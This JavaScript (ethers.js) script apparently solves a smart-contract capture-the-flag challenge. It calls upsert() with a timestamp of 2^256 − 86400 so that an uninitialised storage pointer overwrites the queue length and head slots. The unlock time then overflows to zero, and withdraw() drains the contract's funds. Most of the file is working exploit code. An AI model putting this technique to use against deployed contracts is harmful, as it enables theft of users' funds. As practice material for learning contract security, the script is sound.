
const { utils, BigNumber, Contract } = require('ethers');

var { wallet, provider } = require('./common')

const contractAddress = '0x1D175Fc61C2D8892b1cB91E7eE3540eeE4f971AA';


async function displayQueueAmounts(contractAddress) {
	var len = await provider.getStorageAt(contractAddress, 0);
	var head = await provider.getStorageAt(contractAddress, 1);
	console.log("head 	: ", BigNumber.from(head).toHexString());
	var len = BigNumber.from(len).toNumber();
	var total = BigNumber.from(0);
	for (var i = 0; i < len; i++) {
		const mapDataBegin = BigNumber.from(
			utils.keccak256(
				'0x' + '0'.toString().padStart(64, '0')
			)
		)
		var slot = await provider.getStorageAt(contractAddress, mapDataBegin.add(i * 2));
		console.log('slot', i, slot, BigNumber.from(slot).toHexString());
		total = total.add(BigNumber.from(slot));
	}
	console.log('total 	: ', total.toString());
}

// contribution -> [slot 0, slot 1]
// slot 0 : contribution length
// slot 1 : head
// slot 2 : owner
async function main() {
	const iface = new utils.Interface([
		'function withdraw(uint256 index)',
		'function upsert(uint256 index, uint256 timestamp) payable',
		'function isComplete() view returns (bool)',
		'constructor(address player) payable'
	]);
	var address = await wallet.getAddress();

	var contract = new Contract(contractAddress, iface, provider);
	var contractWithSigner = contract.connect(wallet);


	// step 1: change the unlockTimestamp(head) to be 2 ** 256 - 86400
	{
		// contribution.amount point to the slot 0, which is the map length.
		// contribution.unlockTimestamp point to the slot 1, which is the head value.
		var timestamp = BigNumber.from(2).pow(256).sub(BigNumber.from(86400)).toHexString();
		console.log('timestamp : ', timestamp);

		var tx = await contractWithSigner.upsert(1, timestamp, { value: 1 });
		console.log('tx : ', tx);

		var result = await tx.wait();
		console.log('result : ', result);

		var slot0 = await provider.getStorageAt(contractAddress, 0);
		var slot1 = await provider.getStorageAt(contractAddress, 1);
		console.log('slot0: ', slot0, BigNumber.from(slot0).toHexString());
		console.log('slot1: ', slot1, BigNumber.from(slot1).toHexString());
		await displayQueueAmounts(contractAddress);
		// the map length would be 2
		// the head value would be `timestamp`
	}

	// step 2: change the unlockTimestamp(head) to be 2 ** 256
	{
		var tx = await contractWithSigner.upsert(2, 0, { value: 2 });
		console.log('tx : ', tx);

		var result = await tx.wait();
		console.log('result : ', result);

		var slot0 = await provider.getStorageAt(contractAddress, 0);
		var slot1 = await provider.getStorageAt(contractAddress, 1);
		console.log('slot0: ', slot0, BigNumber.from(slot0).toHexString());
		console.log('slot1: ', slot1, BigNumber.from(slot1).toHexString());
		await displayQueueAmounts(contractAddress);
		// the map length would be 3
		// the head value would be 0
	}

	// the balance of the contract should be 1 ether + 2 wei + 3 wei = 1 ether + 5 wei
	// but we only get 1 ether + 1 wei + 2 wei = 1 ether + 3 wei
	// so need to deposit: (1 ether + 5 wei) - (1 ether + 3 wei )= 2wei

	// TODO step 3: deposit 2 wei to the contract. eg: using RetirementFundAttacker

	// step 4: withdraw index 2
	{
		var tx = await contractWithSigner.withdraw(2);
		var result = await tx.wait();
		console.log('result : ', result);
		await displayQueueAmounts(contractAddress);
	}
}

main().catch(console.error);